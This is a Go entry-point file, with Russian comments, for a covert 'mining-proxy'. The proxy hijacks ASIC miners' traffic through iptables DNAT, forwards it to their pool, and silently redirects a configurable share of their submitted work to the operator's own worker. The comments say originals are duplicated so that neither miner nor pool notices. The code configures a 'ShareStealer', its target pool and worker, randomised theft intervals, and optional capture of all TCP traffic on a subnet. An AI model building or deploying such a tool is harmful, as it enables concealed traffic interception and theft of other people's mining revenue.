// Пакет main — точка входа в mining-proxy.
//
// Задача программы (вся логика подробно описана в ARCHITECTURE.md):
//   - принять TCP-соединения от ASIC-майнеров (после iptables DNAT);
//   - прозрачно проксировать их в реальный (upstream) майнинг-пул;
//   - парсить каждый mining.submit и часть шар (процент 0.1–100%)
//     перенаправлять в целевой пул на наш воркер (комиссия);
//   - оригинал каждой шары ВСЕГДА дублируется в реальный пул, чтобы
//     майнер и пул не замечали подмены и не рвались соединения.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"mining-proxy/config"
	"mining-proxy/iptables"
	"mining-proxy/monitor"
	"mining-proxy/proxy"
)

func main() {
	// --- 1. Аргументы командной строки ---
	// Единственный флаг -config: путь к YAML-конфигу.
	// По умолчанию ищем "config.yaml" в текущей директории.
	cfgPath := flag.String("config", "config.yaml", "path to YAML config file")
	flag.Parse()

	// --- 2. Загрузка конфигурации ---
	// Читаем YAML, применяем дефолты, проверяем обязательные поля.
	// Возвращается заполненная структура Config (см. config/config.go).
	cfg, err := config.Load(*cfgPath)
	if err != nil {
		log.Fatalf("[FATAL] config load: %v", err)
	}

	// Логируем ключевые параметры запуска — чтобы сразу видеть, что стартуем.
	log.Printf("[MAIN] mining-proxy starting...")
	log.Printf("[MAIN] upstream: %s (ssl=%v)", cfg.UpstreamPool, cfg.UpstreamSSL)
	log.Printf("[MAIN] steal to: %s worker=%s (ssl=%v)", cfg.StealTo.Pool, cfg.StealTo.Worker, cfg.StealTo.SSL)
	log.Printf("[MAIN] percentage: %.1f%% | batch: %d | interval: %.0f-%.0f hours",
		cfg.Percentage, cfg.BatchSize, cfg.IntervalMinHours, cfg.IntervalMaxHours)

	// --- 3. Создание "stealer" (ядро логики кражи шар) ---
	// ShareStealer решает для каждой шары: перенаправлять её или нет.
	// Внутри него хранится статистика и персистентное соединение с целевым пулом.
	// Правила (этап 4) — allowlist пар (пул, воркер); пусто = кусать у всех.
	rules := make([]proxy.StealRule, 0, len(cfg.StealRules))
	for _, r := range cfg.StealRules {
		rules = append(rules, proxy.StealRule{Pool: r.Pool, Worker: r.Worker})
	}
	stealRules := proxy.NewStealRules(rules)
	if stealRules.Len() > 0 {
		log.Printf("[MAIN] steal rules: %d (allowlist; остальное сквозняком)", stealRules.Len())
	} else {
		log.Printf("[MAIN] steal rules: не заданы — кусаем у всех (legacy)")
	}
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:    cfg.Percentage,     // доля шар, которые кусаем
		IntervalMin:   cfg.IntervalMin(),  // минимальная пауза между циклами
		IntervalMax:   cfg.IntervalMax(),  // максимальная пауза между циклами
		BatchSize:     cfg.BatchSize,      // размер "пачки" шар за один цикл
		TargetPool:    cfg.StealTo.Pool,   // куда перенаправляем
		TargetWorker:  cfg.StealTo.Worker, // под каким воркером
		TargetPass:    cfg.StealTo.Pass,   // пароль воркера
		TargetSSL:     cfg.StealTo.SSL,    // TLS к целевому пулу?
		TargetTimeout: time.Duration(cfg.TargetTimeoutSec) * time.Second,
		PauseShares:   cfg.PauseShares, // «пауза в шарах» — точный %
		Rules:         stealRules,      // allowlist (пул+воркер), этап 4
	})

	// --- 3a. Heartbeat живости прокси ---
	// Обновляется сервером (accept-цикл + фоновый тикер). Монитор /health
	// отвечает 503, если heartbeat «протух» — на это реагирует watchdog
	// (fail-open). Создаём ДО монитора, чтобы он успел получить ссылку.
	hb := proxy.NewHeartbeat()

	// --- 3b. Реестр «база» пул+воркер (этап 3) ---
	// Наполняется из живого трафика (authorize/submit). Виден в /status.
	// На его основе в дальнейшем будут применяться правила кражи (этап 4).
	disc := proxy.NewDiscovery()

	// --- 4. HTTP-мониторинг ---
	// Эндпоинты /status (JSON-статистика + реестр) и /health (healthcheck).
	// По умолчанию слушает только 127.0.0.1, наружу не отдаётся.
	if cfg.MonitorAddr != "" {
		monitor.StartServer(cfg.MonitorAddr, stealer, hb, disc, cfg.StealTo.Pool, cfg.StealTo.Worker)
	}

	// --- 5. Настройка iptables (NAT/DNAT) ---
	// Если включено (нужен root): создаём цепочку MINING_PROXY, направляем
	// трафик разрешённых подсетей в наш прокси. capture_all_tcp=true —
	// перенаправляем весь TCP подсети (воронка), иначе только порт пула.
	// Cleanup вызывается через defer — правила будут убраны при остановке.
	if cfg.SetupIPTables {
		log.Printf("[MAIN] setting up iptables... (capture_all_tcp=%v)", cfg.CaptureAllTCP)
		if err := iptables.Setup(cfg.AllowedSubnets, cfg.ListenAddr, cfg.UpstreamPort, cfg.CaptureAllTCP); err != nil {
			log.Fatalf("[FATAL] iptables setup: %v", err)
		}
		defer iptables.Cleanup()
	}

	// --- 6. Запуск TCP-прокси ---
	// Листеним на listen_addr, каждое соединение обрабатываем в отдельной
	// goroutine. transparent=true (по умолчанию): реальный адресат берётся
	// из iptables DNAT (SO_ORIGINAL_DST), так что разные клиенты с разными
	// пулами обслуживаются из одного прокси.
	srv := proxy.NewServer(cfg.ListenAddr, cfg.UpstreamPool, cfg.UpstreamSSL, cfg.TransparentOn(), stealer, disc, hb)

	// --- 6a. systemd sd_notify (WatchdogSec) ---
	// Если процесс запущен под systemd (NOTIFY_SOCKET есть) — сообщаем
	// "READY=1" и периодически "WATCHDOG=1", чтобы WatchdogSec не убивал
	// живой прокси. Вне systemd вызовы — no-op.
	if err := notifySystemd("READY=1"); err != nil {
		log.Printf("[MAIN] sd_notify READY: %v", err)
	}
	go sdNotifyLoop()
	go func() {
		if err := srv.Run(); err != nil {
			log.Fatalf("[FATAL] server: %v", err)
		}
	}()

	log.Printf("[MAIN] proxy running on %s", cfg.ListenAddr)
	log.Printf("[MAIN] monitor: http://%s/status", cfg.MonitorAddr)

	// --- 7. Graceful shutdown ---
	// Ждём SIGINT (Ctrl+C) или SIGTERM (systemctl stop). После сигнала
	// дожидаемся завершения всех активных соединений и очищаем iptables.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Printf("[MAIN] shutdown signal received, cleaning up...")
	// Останавливаем сервер (закрывает listener, дожидается активных сессий).
	srv.Shutdown()
	// Останавливаем фоновый health-check и закрываем соединение к целевому пулу.
	stealer.Close()
	fmt.Println("[MAIN] stopped.")
}
